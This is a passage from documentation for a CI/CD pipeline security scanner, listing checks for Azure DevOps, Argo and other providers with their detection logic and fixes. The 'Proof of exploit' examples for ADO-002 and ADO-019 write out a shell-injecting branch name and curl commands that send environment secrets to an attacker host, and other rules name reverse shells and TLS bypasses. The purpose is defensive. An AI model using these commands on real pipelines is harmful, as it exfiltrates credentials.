| [`IAM-006`](#detail-iam-006) | Sensitive actions granted with wildcard Resource | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`IAM-007`](#detail-iam-007) | IAM user has access key older than 90 days | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-008`](#detail-iam-008) | OIDC-federated role trust policy missing audience or subject pin | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`JF-004`](#detail-jf-004) | AWS auth uses long-lived access keys via withCredentials | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-008`](#detail-jf-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-010`](#detail-jf-010) | Long-lived AWS keys exposed via environment {} block | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`KMS-001`](#detail-kms-001) | KMS customer-managed key has rotation disabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`KMS-002`](#detail-kms-002) | KMS key policy grants wildcard KMS actions | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`LMB-002`](#detail-lmb-002) | Lambda function URL has AuthType=NONE | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`LMB-003`](#detail-lmb-003) | Lambda function env vars may contain plaintext secrets | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`LMB-004`](#detail-lmb-004) | Lambda resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-025`](#detail-scm-025) | Repo has write-enabled deploy keys (push backdoor) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SM-001`](#detail-sm-001) | Secrets Manager secret has no rotation configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SM-002`](#detail-sm-002) | Secrets Manager resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`SSM-001`](#detail-ssm-001) | SSM Parameter with secret-like name is not a SecureString | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SSM-002`](#detail-ssm-002) | SSM SecureString uses the default AWS-managed key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-005`](#detail-tkn-005) | Literal secret value in Tekton step env or param default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`TKN-007`](#detail-tkn-007) | Tekton run uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### Vulnerabilities: Project scans for and resolves known vulnerabilities { #ctrl-vulnerabilities }

**Evidenced by 13 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, SCM, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-020`](#detail-ado-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-012`](#detail-argo-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-015`](#detail-bb-015) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-020`](#detail-cc-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-007`](#detail-ecr-007) | Inspector v2 enhanced scanning disabled for ECR | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-008`](#detail-gcb-008) | No vulnerability scanning step in Cloud Build pipeline | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-020`](#detail-gha-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-019`](#detail-gl-019) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-020`](#detail-jf-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`TKN-012`](#detail-tkn-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

## Check details

Every check that evidences this standard, rendered once with its detection mechanism, recommendation, and any known false-positive modes or real-world incident references. The per-control tables above link to the matching block here.

#### `ADO-001`: Task reference not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Floating-major task references (`@1`, `@2`) can roll forward silently when the task publisher ships a breaking or malicious update. Pass when every `task:` reference carries a two- or three-segment semver.

**Recommendation.** Reference tasks by a full semver (`DownloadSecureFile@1.2.3`) or extension-published-version. Track task updates explicitly via Azure DevOps extension settings rather than letting `@1` drift.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `$(Build.SourceBranch*)`, `$(Build.SourceVersionMessage)`, and `$(System.PullRequest.*)` are populated from SCM event metadata the attacker controls. Inline interpolation into a script body executes crafted content.

**Recommendation.** Pass these values through an intermediate pipeline variable declared with `readonly: true`, and reference that variable through an environment variable rather than `$(...)` macro interpolation. ADO expands `$(…)` before shell quoting, so inline use is never safe.

**Proof of exploit.**

# Vulnerable: PR title macro interpolated straight into script.
trigger: none
pr:
  branches:
    include: [main]
jobs:
  - job: triage
    pool: { vmImage: ubuntu-latest }
    steps:
      - script: |
          echo "New PR: $(System.PullRequest.SourceBranch)"
          echo "Subject: $(Build.SourceVersionMessage)"

# Attack: open a PR from a branch whose name carries shell:
#
#   git checkout -b 'foo";curl https://attacker/exfil \
#     -d "$(printenv | base64)";echo "x'
#
# ADO expands ``$(...)`` BEFORE shell quoting, so the macro
# value's `"` closes the echo and the rest becomes shell.
# The PR-validated pipeline has the same service-connection
# credentials a main-branch build would have, so the curl
# exfils every secret in scope. Classic pwn-request shape.

# Safe: route through env so the value is never interpolated
# into the shell template.
      - bash: |
          echo "New PR: $PR_BRANCH"
          echo "Subject: $COMMIT_MSG"
        env:
          PR_BRANCH: $(System.PullRequest.SourceBranch)
          COMMIT_MSG: $(Build.SourceVersionMessage)

**Source:** [`ADO-002`](../providers/azure.md#ado-002) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Scans `variables:` in both the mapping form (`{KEY: VAL}`) and the list form (`[{name: X, value: Y}]`) that ADO supports. AWS keys are detected by value shape regardless of variable name.

**Recommendation.** Store secrets in an Azure Key Vault or a Library variable group with the secret flag set; reference them via `$(SECRET_NAME)` at runtime. For cloud access prefer Azure workload identity federation.

**Source:** [`ADO-003`](../providers/azure.md#ado-003) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-004`: Deployment job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-004 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Without an `environment:` binding, ADO cannot enforce approvals, checks, or deployment history against a named resource. Every `deployment:` job should bind one.

**Recommendation.** Add `environment: <name>` to every `deployment:` job. Configure approvals, required branches, and business-hours checks on the matching Environment in the ADO UI.

**Known false positives.**

- The deploy-name regex (``deploy`` / ``release`` / ``publish`` / ``promote``) flags jobs whose names include those tokens for non-deploy reasons (e.g. ``release-notes-build`` that only generates a changelog). The deploy-command regex similarly fires on test pipelines that exercise ``kubectl apply --dry-run`` or ``helm template`` for validation. Suppress those jobs per-resource via ``--ignore-file`` once you've verified they don't actually mutate any environment.

**Source:** [`ADO-004`](../providers/azure.md#ado-004) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-005`: Container image not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-005 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.

**Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-006 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears anywhere in the pipeline text.

**Recommendation.** Add a task that runs `cosign sign` or `notation sign`, Azure Pipelines' workload identity federation enables keyless signing. Publish the signature to the artifact feed and verify it at deploy time.

**Source:** [`ADO-006`](../providers/azure.md#ado-006) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-007 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact.

**Recommendation.** Add an SBOM step, `microsoft/sbom-tool`, `syft . -o cyclonedx-json`, or `anchore/sbom-action`. Publish the SBOM as a pipeline artifact so downstream consumers can ingest it.

**Source:** [`ADO-007`](../providers/azure.md#ado-007) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-008 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Complements ADO-003 (which looks at `variables:` keys). ADO-008 scans every string in the pipeline against the cross-provider credential-pattern catalog.

**Recommendation.** Rotate the exposed credential. Move the value to Azure Key Vault or a secret variable group and reference it via `$(SECRET_NAME)`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`ADO-008`](../providers/azure.md#ado-008) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-009`: Container image pinned by tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-ado-009 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** ADO-005 fails floating tags at HIGH; ADO-009 is the stricter tier. Even immutable-looking version tags can be repointed by registry operators.

**Recommendation.** Resolve each image to its current digest and replace the tag with `@sha256:<digest>`. Schedule regular digest bumps via Renovate or a scheduled pipeline.

**Source:** [`ADO-009`](../providers/azure.md#ado-009) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-011`: `template: <local-path>` on PR-validated pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-011 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `template: <relative-path>` includes another YAML from the CURRENT repo. On PR validation builds, the repo content is the PR branch, letting the PR author swap the template body. Cross-repo templates (`template: foo.yml@my-repo`) are version-pinned and not affected.

**Recommendation.** Move the template into a separate, branch-protected repository and reference it via `template: foo.yml@<repo-resource>` with a pinned `ref:` on the resource. That way the template content is fixed at PR creation time and can't be modified from the PR branch.

**Source:** [`ADO-011`](../providers/azure.md#ado-011) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-012`: Cache@2 key derives from $(System.PullRequest.*) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-012 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `Cache@2` (and older `CacheBeta@1`) restore by key. A key including PR-controlled variables on PR-validated pipelines lets a PR seed a poisoned cache entry that a later default-branch pipeline restores.

**Recommendation.** Build the cache key from values the PR can't control: `$(Agent.OS)`, lockfile hashes, the pipeline name. Never reference `$(System.PullRequest.*)` or `$(Build.SourceBranch*)` from a cache key namespace.

**Source:** [`ADO-012`](../providers/azure.md#ado-012) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-014`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-014 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values in pipeline variables or task inputs can't be rotated on a fine-grained schedule. Prefer OIDC or vault-based credential injection for cross-cloud access.

**Recommendation.** Use workload identity federation or an Azure Key Vault task to inject short-lived AWS credentials at runtime. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from pipeline variables and task parameters.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Variable values that *reference* a secret rather than embed one (``$(MySecretVar)`` / ``$(AwsKey)`` mapped from a variable group backed by Key Vault) still match the ``AWS_ACCESS_KEY_ID`` / ``AWS_SECRET_ACCESS_KEY`` name regex because the variable name itself looks long-lived. The rule has no way to follow the binding to its source. Suppress per-pipeline via ``--ignore-file`` once you've confirmed the value is injected at runtime from a Key Vault group rather than stored in the YAML.

**Source:** [`ADO-014`](../providers/azure.md#ado-014) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-016 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build agent.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`ADO-016`](../providers/azure.md#ado-016) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-018 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-018`](../providers/azure.md#ado-018) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-019`: `extends:` template on PR-validated pipeline points to local path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-019 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** `extends: template: <local-file>` includes another YAML from the CURRENT repo. On PR validation builds, the repo content is the PR branch, letting the PR author swap the template body and inject arbitrary pipeline logic. Cross-repo templates (`template: foo.yml@my-repo`) are version-pinned and not affected.

**Recommendation.** Pin the extends template to a protected repository ref (`template@ref`). Local templates in PR-validated pipelines can be poisoned by the PR author.

**Proof of exploit.**

# Vulnerable: PR-validated pipeline extends a LOCAL template.
trigger: none
pr:
  branches: { include: [main] }
extends:
  template: templates/standard-build.yml   # no @repo ref

# Attack: a PR author edits ``templates/standard-build.yml``
# in their branch to inject any pipeline body they want.
# The PR-validation run materializes the PR branch first,
# THEN evaluates ``extends:`` against that tree, so the
# attacker's template body runs with the pipeline's service
# connections in scope.
#
# In the PR's templates/standard-build.yml:
#   jobs:
#     - job: exfil
#       steps:
#         - bash: |
#             curl https://attacker.example/x \
#               -d "$(printenv | base64 -w0)"
#
# No further trick needed, ``extends:`` is the gate and the
# PR author controls what's behind it.

# Safe: pin the template to a protected ref in a separate repo.
resources:
  repositories:
    - repository: pipeline-templates
      type: git
      name: ProjectName/pipeline-templates
      ref: refs/tags/v1.4.2     # immutable, signed tag
extends:
  template: templates/standard-build.yml@pipeline-templates

**Source:** [`ADO-019`](../providers/azure.md#ado-019) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-020 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`ADO-020`](../providers/azure.md#ado-020) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-021 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-021`](../providers/azure.md#ado-021) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-022 }

**Evidences:** [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) Project uses an automated dependency-update tool (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`ADO-022`](../providers/azure.md#ado-022) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-023 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-023`](../providers/azure.md#ado-023) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-024 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** On Azure Pipelines the common pattern is a ``Bash@3`` task invoking ``cosign attest --yes --predicate=provenance.json $(image)``. The native Microsoft SBOM tool emits ``_manifest/spdx_2.2/manifest.spdx.json`` for SBOM but does not produce provenance on its own.

**Recommendation.** Add a task that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or Microsoft's ``sbom-tool`` in attestation mode. ADO-006 covers signing; this rule covers the in-toto statement SLSA Build L3 additionally requires.

**Source:** [`ADO-024`](../providers/azure.md#ado-024) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-025`: Cross-repo template not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-025 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Azure Pipelines resolves ``template: build.yml@tools`` against the ``tools`` repo resource's ``ref:`` field. When that ref is ``refs/heads/main`` (or missing, which defaults to the pipeline's default branch), a push to the callee repo changes what your pipeline runs on the next invocation.

**Recommendation.** On every ``resources.repositories`` entry referenced from a ``template: ...@repo-alias`` directive, set ``ref: refs/tags/<sha>`` or the bare 40-char commit SHA, never a branch or floating tag. A moved branch/tag swaps the template body without changing your pipeline file.

**Source:** [`ADO-025`](../providers/azure.md#ado-025) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-026`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-026 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** ADO pipelines can run arbitrary shell via ``bash`` / ``script`` / ``powershell`` tasks. This rule scans every string value for known-bad patterns (reverse shells, base64-decoded execution, miner binaries, exfil channels). Orthogonal to ADO-016/ADO-017/ADO-023.

**Recommendation.** Treat as a potential compromise. Identify the PR/branch that added the matching task(s), rotate any Service Connections the pipeline can reach, and audit Pipeline run logs for outbound traffic to the matched hosts.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`ADO-026`](../providers/azure.md#ado-026) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-027 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Complements ADO-002 (script injection from untrusted PR context). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`ADO-027`](../providers/azure.md#ado-027) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-028 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Complements ADO-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Azure Artifacts) instead of installing from a filesystem path or tarball URL.

**Source:** [`ADO-028`](../providers/azure.md#ado-028) in the [Azure DevOps provider](../providers/azure.md).

#### `ARGO-001`: Argo template container image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Walks ``spec.templates[].container``, ``spec.templates[].script``, and ``spec.templates[].containerSet.containers[]``. The image must contain ``@sha256:`` followed by a 64-char hex digest.

**Recommendation.** Pin every container / script template image to a content-addressable digest (``alpine@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the workflow's containers at the next pull, with no audit trail in the WorkflowTemplate.

**Source:** [`ARGO-001`](../providers/argo.md#argo-001) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-002`: Argo template container runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detection fires on ``securityContext.privileged: true``, ``runAsUser: 0``, ``runAsNonRoot: false``, ``allowPrivilegeEscalation: true``, or no ``securityContext`` block at all. Also walks ``spec.podSpecPatch`` (raw YAML) for an explicit ``privileged: true`` token.

